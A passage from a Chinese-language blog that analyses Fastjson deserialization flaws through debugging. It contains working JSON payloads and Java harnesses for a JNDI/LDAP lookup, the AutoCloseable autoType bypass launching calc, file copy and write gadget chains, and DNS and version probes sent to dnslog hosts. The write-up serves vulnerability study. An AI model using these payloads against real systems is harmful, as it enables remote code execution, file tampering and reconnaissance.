alt="image-20240903193000515"></p><p>利用链分析：</p><p>根据poc来看看漏洞点</p><p><img src="https://cdn.clown2024.cn/202409031938377.png" alt="image-20240903193814261"></p><p><img src="https://cdn.clown2024.cn/202409031938851.png" alt="image-20240903193827745"></p><p>所以就是从jndiNames遍历，然后在getTm方法中触发jndi漏洞，这里的tm属性只有get方法</p><p>但是根据他的返回值看起来并不满足我们前面说的触发get方法的特征，这里就涉及到Fastjson的循环引用</p><p><strong>循环引用</strong></p><p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>fastjson支持循环引用，并且是缺省打开的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//引用可以自己关闭，关闭后可能导致json数据传输的时候丢失<br>//全局配置关闭<br>JSON.DEFAULT_GENERATE_FEATURE |= SerializerFeature.DisableCircularReferenceDetect.getMask();<br>//非全局关闭<br>JSON.toJSONString(obj, SerializerFeature.DisableCircularReferenceDetect);<br></code></pre></td></tr></table></figure><table><thead><tr><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>{“$ref”:”$”}</td><td>引用根对象</td></tr><tr><td>{“$ref”:”@”}</td><td>引用自己</td></tr><tr><td>{“$ref”:”..”}</td><td>引用父对象</td></tr><tr><td>{“$ref”:”..&#x2F;..”}</td><td>引用父对象的父对象</td></tr><tr><td>{“$ref”:”$.members[0].reportTo”}</td><td>基于路径的引用</td></tr></tbody></table><p><code>$ref</code>即循环引用：当一个对象包含另一个对象时，Fastjson就会把该对象解析成引用。引用是通过<code>$ref</code>标示的。</p><p>所以这里poc后面的{“$ref”:”$.tm”}就是基于路径引用，相当于调用了根对象的tm属性，自然就要调用get方法，这里的根对象就是CacheJndiTmLookup</p><p><strong>org.apache.shiro.jndi.JndiObjectFactory</strong></p><p>需要shiro-core和slf4j-api依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031934084.png" alt="image-20240903193341386"></p><p><strong>利用链分析</strong></p><p><img src="https://cdn.clown2024.cn/202409032004058.png" alt="image-20240903200449945"></p><p><img src="https://cdn.clown2024.cn/202409032004849.png" alt="image-20240903200455729"></p><p>这里就同理，该类也是只有getInstance方法，然后利用循环引用然后调用到get方法触发jndi漏洞</p><h2><span id="fastjson1268">Fastjson1.2.68</span></h2><p>这次是利用expectClass来绕过checkAutoType函数，大体思路如下：</p><ol><li>先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数；</li><li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；</li></ol><p>利用条件：</p><ul><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><p>这里先展示攻击流程</p><p>假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">VulAutoCloseable</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>poc如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-comment">//fastjson1.2.68</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoType_RaoGuo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.clown.vul.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031446394.png" alt="image-20240903144639232"></p><p>可以看到没有开启autoTypeSupport也能够成功</p><p>直接从checkAutoType函数开始调试</p><p><img src="https://cdn.clown2024.cn/202409031453120.png" alt="image-20240903145345998"></p><p>到这里可以直接可以从缓存中获取到AutoCloseable这个类</p><p><img src="https://cdn.clown2024.cn/202409031502045.png" alt="image-20240903150200931"></p><p>然后往下直接return了，因为这时候expectClass还是空的</p><p><img src="https://cdn.clown2024.cn/202409031532444.png" alt="image-20240903153245307"></p><p>然后传进去AutoCloseable反序列化，继续跟进</p><p><img src="https://cdn.clown2024.cn/202409031542039.png" alt="image-20240903154215912"></p><p>到这里获取反序列化器为空，然后typeName为我们的实现类，expectClass传递的是AutoCloseable类，继续跟进checkAutoType函数</p><p><img src="https://cdn.clown2024.cn/202409031554161.png" alt="image-20240903155427045"></p><p>到这里expectClassFlag就为true了</p><p><img src="https://cdn.clown2024.cn/202409031557163.png" alt="image-20240903155741275"></p><p>最后走到这个地方，expectClassFlag使判断为true，最终进行loadClass</p><p><img src="https://cdn.clown2024.cn/202409031604442.png" alt="image-20240903160414341"></p><p>然后往下有对加载的类进行判断，这些都是常见的jndi利用链的类，如果属于这些类或者子类直接抛出异常</p><p><img src="https://cdn.clown2024.cn/202409031602941.png" alt="image-20240903160225818"></p><p>往下还有一个加入缓存，然后return，这里还判断了我们的clazz是否为expectClass的子类，所以恶意类必须要继承expectClass</p><p>然后就是反序列化触发构造函数弹计算器</p><blockquote><p>不过这里不过get或者set直接构造函数也可以了，在早期版本我试了一下只能默认构造方法，不过如果存在默认构造方法也是优先默认构造方法</p></blockquote><h3><span id="实战利用">实战利用</span></h3><p>实战中要去找实际可行的利用类，也就是继承了autoCloaseable类的，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。</p><p>寻找gadget的条件可以参考这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">需要一个通过 set 方法或构造方法指定文件路径的 OutputStream<br>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream<br>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法<br>以上三个组合在一起就能构造成一个写文件的利用链，我通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。<br></code></pre></td></tr></table></figure><p>下面是一些利用payload</p><p><strong>复制文件</strong></p><p>利用类：<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p><p>利用依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>去看一下SafeFileOutputStream的源码：</p><p><img src="https://cdn.clown2024.cn/202409031659197.png" alt="image-20240903165946075"></p><p>该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中</p><p>利用PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;D:/win.txt&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Move</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;D:/win.txt\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031704660.png" alt="image-20240903170451492"></p><p><strong>文件写入</strong></p><p>写内容类：<strong>com.esotericsoftware.kryo.io.Output</strong></p><p>依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Output类主要用来写内容，它提供了setBuffer()和setOutputStream()两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其flush()函数</p><p>看一下Output类的源码</p><p><img src="https://cdn.clown2024.cn/202409031911793.png" alt="image-20240903191151647"></p><p><img src="https://cdn.clown2024.cn/202409031915040.png" alt="image-20240903191539933"></p><p><img src="https://cdn.clown2024.cn/202409031913515.png" alt="image-20240903191344410"></p><p>所以我们要想办法调用到Output的flush函数</p><p>flush函数可以在调用close函数和require函数时触发</p><p><img src="https://cdn.clown2024.cn/202409032015641.png" alt="image-20240903201552519"></p><p><img src="https://cdn.clown2024.cn/202409032015969.png" alt="image-20240903201535860"></p><p>然后require函数在write相关函数触发</p><p><img src="https://cdn.clown2024.cn/202409032016029.png" alt="image-20240903201620928"></p><p><img src="https://cdn.clown2024.cn/202409032017695.png" alt="image-20240903201703586"></p><p>然后找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数，满足前面的需求</p><blockquote><p>这都咋找的啊😢</p></blockquote><p><img src="https://cdn.clown2024.cn/202409032020430.png" alt="image-20240903202010304"></p><p><img src="https://cdn.clown2024.cn/202409032020708.png" alt="image-20240903202044589"></p><p>然后对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在</p><p><img src="https://cdn.clown2024.cn/202409032023421.png" alt="image-20240903202324306"></p><p>但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发，然后找到只有有参构造函数的ObjectOutputStream继承类：<strong>com.sleepycat.bind.serial.SerialOutput</strong>，这个类在这个依赖里面</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sleepycat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>je<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032027918.png" alt="image-20240903202720784"></p><p>然后这里调用了父类的构造方法，到这里最终满足条件</p><p>poc如下，然后也运用了前面的循环引用技巧</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是写入文件有限，有些特殊字符写不了，比如php代码</p><blockquote><p>payload直接抄了，怎么写出来的就不管了（</p></blockquote><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Write</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;targetPath\&quot;: \&quot;D:/hacked.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;tempPath\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032034460.png" alt="image-20240903203402350"></p><p>buff这里传的是base64之后的数据</p><p><strong>补丁分析</strong></p><p>额额额该版本之后的补丁又是粗暴的给expectClass多加上一些黑名单</p><h2><span id="safemode">SafeMode</span></h2><p>在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。</p><p>开启如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setSafeMode(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>开启之后直接完全禁用autoType，即@type</p><p><img src="https://cdn.clown2024.cn/202409032040917.png" alt="image-20240903204034792"></p><p>获取是否设置了SafeMode，如果是则直接抛出异常终止运行</p><h1><span id="fastjson1280">Fastjson1.2.80</span></h1><p>1.2.68之后新版本将<code>java.lang.Runnable、java.lang.Readable和java.lang.AutoCloseable</code>加入了黑名单，这里就利用另一个期望类，异常类<code>Throwable</code></p><p>这里就看一下这篇文章就行了：<a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%BE%88%E9%9A%BE%E6%9C%89rce%E7%9A%84%E7%82%B9%EF%BC%88%E4%B8%BB%E8%A6%81%E6%98%AF%E6%87%92%E4%BA%86%E4%B8%8D%E6%83%B3%E5%86%8D%E5%86%99%E4%BA%86%F0%9F%98%A2">https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ，因为看起来很难有rce的点（主要是懒了不想再写了😢</a></p><h1><span id="信息探测">信息探测</span></h1><p>平时用于探测fastjson的一些信息来考虑如何利用，参考文章：<a href="https://forum.butian.net/share/2858%EF%BC%8Chttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://forum.butian.net/share/2858，https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p>然后使用safe6Sec师傅的复现环境来做测试：<a href="https://github.com/safe6Sec/ShiroAndFastJson">https://github.com/safe6Sec/ShiroAndFastJson</a></p><p>将其中&#x2F;json路由的代码修改一下方便查看解析结果或者解析报错：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/json&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String data)</span> &#123;<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">0</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;message&quot;</span>, String.valueOf(JSON.parse(data)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, -<span class="hljs-number">1</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;error&quot;</span>, e.getMessage());<br>    &#125;<br>    <span class="hljs-keyword">return</span> jsonObject;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面直接向&#x2F;json路由进行post请求即可</p><h2><span id="版本探测">版本探测</span></h2><p>参考文章：<a href="https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p><strong>具体版本探测</strong></p><p>参考文章：<a href="https://b1ue.cn/archives/402.html">https://b1ue.cn/archives/402.html</a></p><p>具体原理是JavaBeanDeserializer 类异常的 message 会把当前 fastjson 的版本号输出，所以需要构造出能令这个类抛出异常的错误即可</p><p><img src="https://cdn.clown2024.cn/202409052248218.png" alt="image-20240905224846071"></p><p>这里直接列出文章需要满足的报错条件：</p><ul><li>当代码使用 <code>JSON.parseObject(json , clazz)</code> 指定期望类的方式去解析 JSON，且 clazz 不能为 fastjson 已设定的大部分类型，如“Hashmap”、“ArrayList”</li><li>当使用 <code>JSON.parse(json)</code> 不指定期望类的时候可以通过 AutoCloseable 来触发</li></ul><p>比如这样：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>   <span class="hljs-comment">//该方法尝试了一下直到1.2.80都还可以探测出</span><br> <br><span class="hljs-comment">//下面这个据说也能探测，但是该靶场没有成功</span><br><span class="hljs-punctuation">[</span><span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409052252040.png" alt="image-20240905225213882"></p><p><strong>探测DNS</strong></p><p>参考文章：<a href="https://blog.csdn.net/why811/article/details/133679673">https://blog.csdn.net/why811/article/details/133679673</a></p><p>DNS探测主要是为了探测是否为fastjson</p><p>这里dnslog可以直接用yakit生成</p><p><img src="https://cdn.clown2024.cn/202409051322413.png" alt="image-20240905132158243"></p><p>这里纯收集payload复现了，没找到什么分析的文章</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;muwoiavfqk.dgrh3.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>不过这个gadget在1.2.48禁止了</p></blockquote><p>1.2.68版本结果</p><p><img src="https://cdn.clown2024.cn/202409051325045.png" alt="image-20240905132543897"></p><p>笑死yakit的dnslog没记录出来，dnslog平台的可以</p><p><img src="https://cdn.clown2024.cn/202409051337491.png" alt="image-20240905133750354"></p><p><img src="https://cdn.clown2024.cn/202409051337590.png" alt="image-20240905133730460"></p><p>各种payload</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span 